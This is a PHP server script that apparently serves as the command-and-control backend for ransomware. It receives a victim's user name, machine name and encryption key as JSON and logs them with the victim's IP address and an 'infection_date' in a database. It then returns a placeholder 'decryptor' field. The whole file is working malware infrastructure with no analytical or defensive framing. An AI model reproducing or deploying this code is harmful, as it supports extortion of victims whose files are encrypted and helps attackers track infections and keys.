<?php
include_once './php/database.class.php';
header('Content-Type: application/json; charset=UTF-8');
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    $raw = file_get_contents('php://input');
    if ($raw) {
        $data = @json_decode($raw);
        if ($data) {
            $response = array(
                'status' => 'ok',
                'message' => ''
            );
            if (isset($data->user) && isset($data->machine) && isset($data->key)) {
                $parameters = array(
                    'user' => trim($data->user),
                    'machine' => trim($data->machine),
                    'key' => trim($data->key)
                );
                mb_internal_encoding('UTF-8');
                if (mb_strlen($parameters['user']) >= 1 && mb_strlen($parameters['user']) <= 30 && mb_strlen($parameters['machine']) >= 1 && mb_strlen($parameters['machine']) <= 30 && mb_strlen($parameters['key']) >= 1 && mb_strlen($parameters['key']) <= 300) {
                    $db = new Database();
                    if ($db->isConnected()) {
                        $db->query('INSERT INTO `data` (`user`, `machine`, `key`, `ip`, `infection_date`) VALUES (:user, :machine, :key, :ip, :infection_date)');
                        $db->bind(':user', $parameters['user']);
                        $db->bind(':machine', $parameters['machine']);
                        $db->bind(':key', $parameters['key']);
                        $db->bind(':ip', $_SERVER['REMOTE_ADDR']);
                        $db->bind(':infection_date', date('Y-m-d H:i:s', time()));
                        if ($db->execute()) {
                            // send the decryptor
                            $response['decryptor'] = '';
                        } else {
                            $response['status'] = 'error';
                            $response['message'] = 'Database error. Try again later.';
                        }
                    } else {
                        $response['status'] = 'error';
                        $response['message'] = 'Database error. Try again later.';
                    }
                    $db->disconnect();
                } else {
                    $response['status'] = 'error';
                    $response['message'] = 'Invalid data. Try again.';
                }
            } else {
                $response['status'] = 'error';
                $response['message'] = 'Required data is missing. Try again.';
            }
            echo json_encode($response, JSON_PRETTY_PRINT);
        }
    }
}
?>
